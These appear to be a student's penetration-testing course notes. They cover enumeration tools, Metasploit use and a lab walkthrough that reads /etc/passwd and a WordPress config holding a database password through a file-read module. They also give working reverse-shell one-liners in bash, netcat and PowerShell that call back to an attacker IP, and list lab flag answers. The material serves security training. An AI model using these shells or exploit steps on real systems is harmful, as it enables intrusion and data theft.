# Infosec Overview
Some specializations of Information Security are:
- Network and infrastructure security
- Application security
- Security testing
- Systems auditing
- Business continuity planning
- Digital forensics
- Incident detection and response
**Information security** is the practice of protecting data from unauthorized access, changes, unlawful use, disruption, etc. 
## Risk Management Process
1. Identifying the risk
2. Analyze the risk
3. Evaluate the risk
4. Dealing with risk
5. Monitoring risk
### Role of Penetration Testers
A security assessor helps an organization identify risks in its external and internal networks. 

A hypervisor is software that allows us to create and run virtual machines. 
# Staying Organized
## Folder Structure
We should have a folder to save the next information: scoping information, enumeration data, evidence of exploitation attempts, sensitive data as credentials, and other data obtainend during recon, exploitation, and post-exploitation. A sample folder structure may look like this:

```shell-session
Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

It's a personal preference, but there are people who like to create a folder for each target host and save screenshots within it. Other organize their notes by host or network and save screenshots directly into the note-taking tool.

Tip: Research about GitBook, it might be useful for notetaking.

We should maintain checklists, report templates for various assessment types, and build a findings/vulnerability database. It can take a form of a spreadsheet or something more complex and include a:
- Finding title
- Description
- Impact
- Remediation advice
- References

# Connecting Using VPN
A Virtual Private Network (VPN) allow us to connect to a private network and access hosts and resources as if we were directly connected to the target private network. 
VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel. 

At a high-level, VPN works by routing our connecting device's internet connection through the target VPN's private server instead of our internet service provider. When connected to a VPN, data originates from the VPN server rather than our computer and will appear to originate from a public IP address other than our own. 

## Types of remote access VPNs
- Client-based VPN: Requires the use of client software to establish the VPN connection. Once connected, the user's host will work mostly as if it were connected directly to the company network.
- SSL VPN: Uses the web browser as the VPN client. The connection is established between the browser and an SSL VPN gateway can be configured to only allow access to web-based applications such as email and intranet sites. 

## Why Use a VPN?
It provides a layer of security and privacy. But, since we are connecting to a company's server, there is always the change that data is being logged or the VPN service is not following security best practices or the security features that they advertise. Usage of a VPN service **DOES NOT** guarantee anonymity or privacy but is useful for bypassing certain network/firewall restrictions or when connected to a possible hostile network. 

### Commands
```bash
ifconfig # We can see the Wi-Fi adapters
netstat -rn # It will show us the networks accessible via the VPN
```

# Common Terms
## Shell
It is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. 

Most Linux systems use Bash (Bourne Again Shell). It is a enhanced version of `sh`, the Unix systems' original shell program. 

### Types of shell connections
- Reverse shell: Initiates a connection back to a "listener" on our attack box.
- Bind shell: "Binds" to a specific port on the target host and waits for a connection from our attack box.
- Web shell: Runs OS commands via the web browser, typically not interactive or semi-interactive. 

## Port
Virtual point where network connections begin and end. We can associate it with a window or a door in a house. If we leave it open or not properly locked, anyone can enter to the house. 
Ports are software-based and managed by the host OS.
Ports are associated with a specific process or service and allow computers to differentiate between different traffic types.

Each port is assigned a number, and many are standardized across all network-connected devices.
- HTTP: 80
- HTTPS: 443

### Categories of ports
- Transmission Control Protocol (TCP): It is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. 
- User Datagram Protocol (UDP): It utilizes a connectionless communication model. There is no handshake like before, so it introduces a certain amount of unreliability since there is no guarantee of data delivery. 

There are 65.535 TCP ports and 65.535 different UDO ports, each denoted by a number. 

- 20/21 (TCP): FTP
- 22 (TCP): SSH
- 23 (TCP): Telnet
- 25 (TCP): SMTP
- 80 (TCP): HTTP
- 161 (TCP/UDP): SNMP
- 389 (TCP/UDP): LDAP
- 443 (TCP): SSL/TLS (HTTPS)
- 445 (TCP): SMB
- 3389 (TCP): RDP
## What is a Web Server
It is an application that runs on the back-end server, which handles all of the HTTP traffic from the client-side browser.

# Basic Tools
- SSH
- Netcat
- Tmux
- Vim
## Using SSH
Secure Shell is a network protocol that runs on port 22 by default. SSH can be configured with password authentication or passwordless using public-key authentication using an SSH public/private key pair. 

## Using Netcat
It is an excellent nertwork utility for interacting with TCP/UDP ports. It can be used for many things during a pentest. Its primary usave is for connecting to shells. It can be used to connect to any listening port and interact with the service running on that port. We can connect to the 22 port with the next command:
```bash
netcat 10.10.10.10 22
```

We can obtain a banner, so we can know if there is a service running on it. This technique is called Banner Grabbing. 

Socat is another useful tool that has another features like forwarding ports and connecting to serial devices. It can also be used to upgrade a shell to a fully interactive TTY. 

## Using Vim
It is a great text editor that can be used for writing code or editing text files on Linux systems. 
- i: Edit the file
- x: Cut character
- dw: Cut word
- dd: Cut full line
- yw: Copy word
- yy: Copy full line
- p: Paste
- :1 - Go to line number 1
- :w - Write the file, save
- :q - Quit
- :q! - Quit without saving
- :wq - Write and quit

Tip: We can use `4yw` to copy 4 words instead of one.
# Service Scanning
The first we need to do is identify the OS and any available services that might be running. 
The range of well-known ports are 1 to 1023, where they are reserved for privileged services. 
## Nmap
```bash
```shell-session
nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

### Headings
- PORT: It also tells us that these are TCP ports. By default, nmap will conduct a TCP scan unless requested.
- STATE: It confirms that these ports are open.
- SERVICE: It tells us the service's name is typically mapped to the specific port number. 

Port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine. 

### Parameters
- -sC: It is used to specify that nmap scripts should be used to try and obtain more detailed information.
- -sV: It instructs nmap to perform a version scan.
- -p-: It tells nmap that we want to scan all 65535 TCP ports

The syntax for running an nmap script is
```bash
nmap --script <script name> -p<port> <host>
```

## Attacking Network Services
### Banner Grabbing
```shell-session
nmap -sV --script=banner <target>
nc -nv 10.129.42.253 21
nmap -sV --script=banner -p21 10.10.10.0/24
```
### SMB (Server Message Block)
It is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. 
```shell-session
nmap --script smb-os-discovery.nse -p445 10.10.10.40
nmap -A -p445 10.129.42.253
```

### Shares
SMB allows users and administrators to share folders and make them accessible remotely by other users. A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the passsword prompt.
```shell-session
smbclient -N -L \\\\10.129.42.253
Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

We can attempt to connect as the guest user:
```shell-session
smbclient \\\\10.129.42.253\\users
```

And with a username:
```shell-session
smbclient -U <username> \\\\10.129.42.253\\users
```
### SNMP
SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. Examination of process parameters might reveal credentials passed on the command line.

```shell-session
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```

- `snmpwalk`: The tool itself.
- `-v 2c`: This specifies SNMP version 2c.
- `-c public`: Community string. This is like a password. If it's wrong, the device won't talk to you.
- `1.3.6.1...`: The OID (Object Identifier). This is a specific "address" in the device's database.

You can walk the entire system by using a shorter, root OID: `1.3.6.1.2.1`

Tip: If `public` does not work, try `private`, `manager` or `internal`.

There is a tool called onesixtyone that can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt`.
```shell-session
onesixtyone -c dict.txt 10.129.42.254
```

#### Questions
1. Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?
```bash
Nmap scan report for 10.129.17.34  
Host is up (0.16s latency).  
Not shown: 993 closed tcp ports (reset)  
PORT     STATE SERVICE     VERSION  
21/tcp   open  ftp         vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25  2021 pub  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.14.142  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 1  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 a0:01:d7:79:e9:d2:09:2a:b8:d9:b4:9a:6c:00:0c:1c (RSA)  
|   256 2b:99:b2:1f:ec:1a:5a:c6:b7:be:b5:50:d1:0e:a9:df (ECDSA)  
|_  256 e4:f8:17:8d:d4:71:d1:4e:d4:0e:bd:f0:29:4f:6d:14 (ED25519)  
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))  
|_http-title: PHP 7.4.3 - phpinfo()  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
139/tcp  open  netbios-ssn Samba smbd 4  
445/tcp  open  netbios-ssn Samba smbd 4  
2323/tcp open  telnet      Linux telnetd  
8080/tcp open  http        Apache Tomcat  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-title: Apache Tomcat  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Host script results:  
| smb2-security-mode:    
|   3:1:1:    
|_    Message signing enabled but not required  
| smb2-time:    
|   date: 2026-02-05T15:34:32  
|_  start_date: N/A  
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 35.20 seconds
```

	Apache Tomcat
2. Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.
	2323
3. List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.
	dceece590f3284c3866305eb2473d099

# Web Enumeration
## Gobuster
We can use `ffuf` or `GoBuster` to perform directory enumeration. 
## Directory/File Enumeration
Gobuster is a tool that allows for performing DNS, vhost, and directory brute-forcing. 
```shell-session
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

In this case, visiting /wordpress in a browser reveals that WordPress is still in setup mode, which will allow us to gain remote code execution on the server.

## DNS Subdomain Enumeration
```shell-session
git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -y
```

Next, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. 
```shell-session
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

## Web Enumeration Tips
### Banner Grabbing / Web Server Headers
We can use `cURL` to retrieve server header information from the command line. 
```shell-session
curl -IL https://www.inlanefreight.com
```

Another useful tool is `EyeWitness`, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

### Whatweb
We can extract the version of web servers, supporting frameworks, and applications using this tool. 
```shell-session
whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24
```

### Certificates
We can view some useful information, like email addresses and contacts to do a phishing attack if it's in the scope of the assessment.

### Robots.txt
Its porpuse is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. 

### Source Code
With `[CTRL + U]` we can see the source code. 

#### Questions
1. Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.
	```bash
	gobuster dir -u http://154.57.164.75:30160/ -w /usr/share/seclists/Discovery/Web-Content/common.txt    
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://154.57.164.75:30160/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.htaccess            (Status: 403) [Size: 281]  
/.htpasswd            (Status: 403) [Size: 281]  
/.hta                 (Status: 403) [Size: 281]  
/index.php            (Status: 200) [Size: 990]  
/robots.txt           (Status: 200) [Size: 45]  
/server-status        (Status: 403) [Size: 281]  
Progress: 4370 / 4747 (92.06%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 4370 / 4747 (92.06%)  
===============================================================  
Finished  
===============================================================
	```

In the `robots.txt` file we can find this:
![[Pasted image 20260205130300.png]]
If we go to this section and we see the source code, we find this:
![[Pasted image 20260205130352.png]]

We put the credentials in the fields and we can obtain the flag:
	**HTB{w3b_3num3r4710n_r3v34l5_53cr375}**

# Public Exploits
## Finding Public Exploits
One way of doing this is to search on google with the word "exploit" to see if we can get any results. 

A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. 
```shell-session
sudo apt install exploitdb -y
```

We can search for a specific application by its name:
```shell-session
searchsploit openssh 7.2
```

## Metasploit Primer
It contains `Meterpreter`, which is a great tool to connect to shells and run commands on the compromised targets.

Once we enter on metasploit, we can search for different vulnerabilities:
```shell-session
search exploit eternalblue
```

> Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search.

If we find one exploit, we can use it with the following command:
```shell-session
use exploit/windows/smb/ms17_010_psexec
```

Before running it, we have to configure the module with `show options` and we can put on LHOST the IP associated with our `tun0` interface.
```shell-session
set RHOSTS 10.10.10.40 
RHOSTS => 10.10.10.40

set LHOST tun0
LHOST => tun0
```

Before we run the script, we can run a check to ensure the server is vulnerable with `check`. The, we can use `run` or `exploit` to run the exploit.

These are some retired boxes to practice Metasploit:
- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

#### Questions
1. Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

The first approach I take is the next one:
I used nmap on this host to scan the services and versions of them so I can search them with searchsploit or metasploit.
First, I searched it on searchsploit with the command:
```bash
searchsploit mariadb 5.5.5  
----------------------------------------------------------------------------------- ---------------------------------  
Exploit Title                                                                     |  Path  
----------------------------------------------------------------------------------- ---------------------------------  
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Esca | linux/local/40360.py  
----------------------------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results
```

I found this, but I also used metasploit to see if there is any created exploit to use. So, I used (after initiating metasploit) the following commands:
```
search mariadb
use 0
```

There was just one exploit, so I configured the parameters with `show options`:
```bash
set RHOSTS 154.57.164.76
set PORT 31337
run
```

The terminal showed a lot of errors that said:
```bash
Thread 961] caught an unhandled exception: The connection with (154.5  
7.164.76:31337) timed out.  
[*] 154.57.164.76:31337   - 154.57.164.76:31337 Authentication bypass is 100% complete  
[-] 154.57.164.76:31337   - 154.57.164.76:31337 Unable to bypass authentication, this target may not be vulnerable  
[*] 154.57.164.76:31337   - Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed
```

So, it seems we need to use the script we found on searchsploit.
First, I copied the file with `searchsploit -m linux/40360.py`.

I needed to use python2:
```
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py  
sudo python2 get-pip.py
sudo python2 -m pip install mysql-connector-python==8.0.29
python2 40360.py
```

But I need some information to use it, so I re-entered the page and I saw the version of the plugin they were using, so I opened again metasploit and search for this plugin here.
```
search simple backup
use 0
show options
set RHOSTS 154.57.164.76
SET RPORT 31993
run
```

And we can obtain this:
```bash
[+] File saved in: /home/mapacheroja/snap/metasploit-framework/common/.msf4/loot/20260205134812_default_154.57.164.76  
_simplebackup.tra_814778.txt  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
msf auxiliary(scanner/http/wp_simple_backup_file_read) > exit  
                                                                                                                       
(base) ┌──(mapacheroja㉿kali)-[~]  
└─$ cat /home/mapacheroja/snap/metasploit-framework/common/.msf4/loot/20260205134812_default_154.57.164.76_simpleback  
up.tra_814778.txt  
  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false  
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin  
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```

Then, I configured again the module but with the FILEPATH as:
```
set FILEPATH /var/www/html/wp-config.php
```

Then, I read this and found some useful information:
```bash
cat /home/mapacheroja/snap/metasploit-framework/common/.msf4/loot/20260205135815_default_154.57.164.76_simpleback  
up.tra_583265.txt  
  
<?php  
  
/**  
* The base configuration for WordPress  
*  
* The wp-config.php creation script uses this file during the  
* installation. You don't have to use the web site, you can  
* copy this file to "wp-config.php" and fill in the values.  
*  
* This file contains the following configurations:  
*  
* * MySQL settings  
* * Secret keys  
* * Database table prefix  
* * ABSPATH  
*  
* @link https://wordpress.org/support/article/editing-wp-config-php/  
*  
* @package WordPress  
*/  
  
// ** MySQL settings - You can get this info from your web host ** //  
/** The name of the database for WordPress */  
define('DB_NAME', 'wordpress');  
  
/** MySQL database username */  
define('DB_USER', 'wordpress');  
  
/** MySQL database password */  
define('DB_PASSWORD', 'wp-password');  
  
/** MySQL hostname */  
define('DB_HOST', 'localhost');  
  
/** Database Charset to use in creating database tables. */  
define('DB_CHARSET', 'utf8');  
  
/** The Database Collate type. Don't change this if in doubt. */  
define('DB_COLLATE', '');  
  
define('WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST']); //overwrite default localhost to dynamic  
define('WP_HOME', 'http://' . $_SERVER['HTTP_HOST']); //overwrite default localhost to dynamic
```

After determining that the MySQL service was restricted to local connections, I pivoted back to the LFI vulnerability. By leveraging the `wp_simple_backup_file_read` module, I successfully accessed the root directory and retrieved the contents of `/flag.txt`.

```bash
cat /home/mapacheroja/snap/metasploit-framework/common/.msf4/loot/20260205225605_default_154.57.164.76_simpleback  
up.tra_253857.txt  
  
HTB{my_f1r57_h4ck}
```
# Types of Shells
One way to connect to a compromised system is through network protocols, like SSH for linux or WinRM for Windows. 
The other method is through a shell.

## Reverse Shell
It is the most common type of shell. Once we find a vulnerability of remote code execution, we can start a netcat listener on our machine that listens to a specific port.

### Netcat Listener
The first thing we need to do is to start a netcat listener on a port of our choosing:
```shell-session
nc -lvnp 1234
```

#### Flags
- `-l`: Listen mode, to wait for a connection to connect to us.
- `-v`: Verbose mode, so that we knoe when we receive a connection.
- `-n`: Disable DNS resolution and only connect from/to IPs, to speed up the connection.
- `-p 1234`: Port number netcat is listening on, an the reverse connection should be sent to.

### Connect Back IP
```
ip a
```

### Reverse Shell Command
The Payload All the Things page has a list of reverse shell commands that we can use on different operating systems. The firsts commands are for linux-based systems, while the last one is for a Windows system.
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Once there is a connection, the terminal will print the following output:
```shell-session
listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This type of shell is handy when we want to get a quick, reliable connection to our compromised host. But it can be very fragile.

## Bind Shell